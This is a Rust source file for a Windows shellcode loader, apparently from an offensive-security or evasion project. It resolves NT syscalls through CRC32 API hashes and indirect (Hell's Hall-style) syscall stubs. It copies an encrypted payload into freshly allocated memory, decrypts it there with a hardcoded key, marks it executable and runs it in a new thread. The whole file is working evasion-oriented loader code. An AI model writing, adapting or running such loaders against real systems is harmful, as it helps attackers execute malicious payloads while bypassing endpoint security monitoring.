use std::io::{self};
use std::ptr;

mod hellshall;
mod dfc;

use dfc::dfc_decrypt_shellcode;
use hellshall::{NtSyscall, RunSyscall, SetSSn, fetch_nt_syscall};
use windows_sys::Wdk::System::SystemServices::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows_sys::Win32::Foundation::{NTSTATUS, HANDLE};
use windows_sys::Win32::System::Threading::{GetCurrentProcess, GetThreadId};
use std::ffi::c_void;


// macro for fast hash !
#[macro_export]
macro_rules! hash {
    ($api:expr) => {
        $crate::crc32h($api)
    };
}

type PVOID = *mut std::ffi::c_void;
type ULONG = u32;

const NT_ALLOCATE_VIRTUAL_MEMORY_CRC32: u32 = 0xE0762FEB;
const NT_PROTECT_VIRTUAL_MEMORY_CRC32: u32 = 0x5C2D1A97;
const NT_CREATE_THREAD_EX_CRC32: u32 = 0x2073465A;
const NT_WAIT_FOR_SINGLE_OBJECT_CRC32: u32 = 0xDD554681;

mod enc_shellcode;
use enc_shellcode::PAYLOAD;



#[repr(C)]
#[derive(Clone, Copy)]
struct NtApiFunc {
    nt_allocate_virtual_memory: NtSyscall,
    nt_protect_virtual_memory: NtSyscall,
    nt_create_thread_ex: NtSyscall,
    nt_wait_for_single_object: NtSyscall,
}

fn initialize_nt_syscalls(nt: &mut NtApiFunc) -> bool {

    if !fetch_nt_syscall(NT_ALLOCATE_VIRTUAL_MEMORY_CRC32, &mut nt.nt_allocate_virtual_memory) {
        println!("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory");
        return false;
    }

    println!(
        "[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x{:02X}\n\t\t>> Executing 'syscall' instruction Of Address : {:p}",
        nt.nt_allocate_virtual_memory.dw_ssn, nt.nt_allocate_virtual_memory.p_syscall_inst_address
    );

    if !fetch_nt_syscall(NT_PROTECT_VIRTUAL_MEMORY_CRC32, &mut nt.nt_protect_virtual_memory) {
        println!("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory");
        return false;
    }

    println!(
        "[+] Syscall Number Of NtProtectVirtualMemory Is : 0x{:02X}\n\t\t>> Executing 'syscall' instruction Of Address : {:p}",
        nt.nt_protect_virtual_memory.dw_ssn, nt.nt_protect_virtual_memory.p_syscall_inst_address
    );

    if !fetch_nt_syscall(NT_CREATE_THREAD_EX_CRC32, &mut nt.nt_create_thread_ex) {
        println!("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx");
        return false;
    }

    println!(
        "[+] Syscall Number Of NtCreateThreadEx Is : 0x{:02X}\n\t\t>> Executing 'syscall' instruction Of Address : {:p}",
        nt.nt_create_thread_ex.dw_ssn, nt.nt_create_thread_ex.p_syscall_inst_address
    );

    if !fetch_nt_syscall(NT_WAIT_FOR_SINGLE_OBJECT_CRC32, &mut nt.nt_wait_for_single_object) {
        println!("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject");
        return false;
    }
    println!(
        "[+] Syscall Number Of NtWaitForSingleObject Is : 0x{:02X}\n\t\t>> Executing 'syscall' instruction Of Address : {:p}",
        nt.nt_wait_for_single_object.dw_ssn, nt.nt_wait_for_single_object.p_syscall_inst_address
    );

    true
}

#[allow(unused_assignments)]
fn classic_injection_via_syscalls(nt: &NtApiFunc, h_process: HANDLE, payload: &[u8], payload_size: usize) -> bool {
    unsafe {
        let mut status: NTSTATUS = 0;
        let mut address: PVOID = ptr::null_mut();
        let mut size = payload_size;
        let mut old_protection: ULONG = 0;
        let mut thread_handle: HANDLE = ptr::null_mut();

        // allocate memory
        println!("[i] Calling NtAllocateVirtualMemory ... ");
        SetSSn(nt.nt_allocate_virtual_memory.dw_ssn as u16, nt.nt_allocate_virtual_memory.p_syscall_inst_address);
        status = RunSyscall(
            h_process,
            &mut address as *mut PVOID as *mut c_void,
            ptr::null_mut(),
            &mut size as *mut usize as *mut c_void,
            (MEM_RESERVE | MEM_COMMIT) as *mut c_void,
            PAGE_READWRITE as *mut c_void,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );
        
        if status != 0 || address.is_null() {
            println!("[!] NtAllocateVirtualMemory Failed With Error: 0x{:08X}", status);
            return false;
        }

        println!("[+] DONE");
        println!("[+] Allocated Memory At Address {:p}", address);

        println!("[+] Copying Encrypted Shellcode to the memory");

        // Copy payload
        std::ptr::copy_nonoverlapping(payload.as_ptr(), address as *mut u8, payload_size);
        // size = payload_size;
        println!("[+] DONE");


        println!("[#] Press <Enter> To Decrypt Shellcode ... ");
        io::stdin().read_line(&mut String::new()).unwrap();
        // decrypt shellcode 
        println!("[i] Decrypting shellcode in memory ... ");
        let key: [u8; 8] = [0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0];

        dfc_decrypt_shellcode(std::slice::from_raw_parts_mut(address as *mut u8, size), &key);
        
        println!("[+] DONE");
        
        size = payload_size;

        println!("[i] Calling NtProtectVirtualMemory ... ");
        SetSSn(nt.nt_protect_virtual_memory.dw_ssn as u16, nt.nt_protect_virtual_memory.p_syscall_inst_address);
        status = RunSyscall(
            h_process,
            &mut address as *mut PVOID as *mut c_void,
            &mut size as *mut usize as *mut c_void,
            PAGE_EXECUTE_READ as *mut c_void,
            &mut old_protection as *mut ULONG as *mut c_void,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );

        if status != 0 {
            println!("[!] NtProtectVirtualMemory Failed With Status: 0x{:08X}", status);
            return false;
        }
        println!("[+] DONE");

        println!("[#] Press <Enter> To Execute Shellcode ... ");
        io::stdin().read_line(&mut String::new()).unwrap();

        println!("[i] Calling NtCreateThreadEx ... ");
        SetSSn(nt.nt_create_thread_ex.dw_ssn as u16, nt.nt_create_thread_ex.p_syscall_inst_address);

        status = RunSyscall(
            &mut thread_handle as *mut HANDLE as *mut c_void,
            2097151u32 as *mut c_void, // THREAD_ALL_ACCESS
            ptr::null_mut(),
            h_process,
            address,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );

        if status != 0 {
            println!("[!] NtCreateThreadEx Failed With Status: 0x{:08X}", status);
            return false;
        }

        println!("[+] DONE");
        println!("[+] Thread {} Created Of Entry: {:p}", GetThreadId(thread_handle), address);

        println!("[i] Calling NtWaitForSingleObject ... ");
        SetSSn(nt.nt_wait_for_single_object.dw_ssn as u16, nt.nt_wait_for_single_object.p_syscall_inst_address);
        status = RunSyscall(
            thread_handle,
            0 as *mut c_void, // infinite !
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );
        if status != 0 {
            println!("[!] NtWaitForSingleObject Failed With Error: 0x{:08X}", status);
            return false;
        }
        println!("[+] DONE");

        true
    }
}

fn main() {
    unsafe {
        let mut nt = NtApiFunc {
            nt_allocate_virtual_memory: NtSyscall {
                dw_ssn: 0,
                dw_syscall_hash: 0,
                p_syscall_address: ptr::null_mut(),
                p_syscall_inst_address: ptr::null_mut(),
            },
            nt_protect_virtual_memory: NtSyscall {
                dw_ssn: 0,
                dw_syscall_hash: 0,
                p_syscall_address: ptr::null_mut(),
                p_syscall_inst_address: ptr::null_mut(),
            },
            nt_create_thread_ex: NtSyscall {
                dw_ssn: 0,
                dw_syscall_hash: 0,
                p_syscall_address: ptr::null_mut(),
                p_syscall_inst_address: ptr::null_mut(),
            },
            nt_wait_for_single_object: NtSyscall {
                dw_ssn: 0,
                dw_syscall_hash: 0,
                p_syscall_address: ptr::null_mut(),
                p_syscall_inst_address: ptr::null_mut(),
            },
        };

        println!("[#] Press <Enter> To Start The Program ... ");
        io::stdin().read_line(&mut String::new()).unwrap();

        if !initialize_nt_syscalls(&mut nt) {
            println!("[!] Failed To Initialize The Specified Indirect-Syscalls");
            return;
        }

        println!("[#] Press <Enter> To Continue ... ");
        io::stdin().read_line(&mut String::new()).unwrap();

        if PAYLOAD.is_empty() {
            println!("[!] No Payload Provided");
            return;
        }

        if !classic_injection_via_syscalls(&nt, GetCurrentProcess(), &PAYLOAD, PAYLOAD.len() as usize) {
            println!("[!] Unable to perform Classic injection");
            return;
        }

        println!("[#] Press <Enter> To Quit ... ");
        io::stdin().read_line(&mut String::new()).unwrap();
    }
}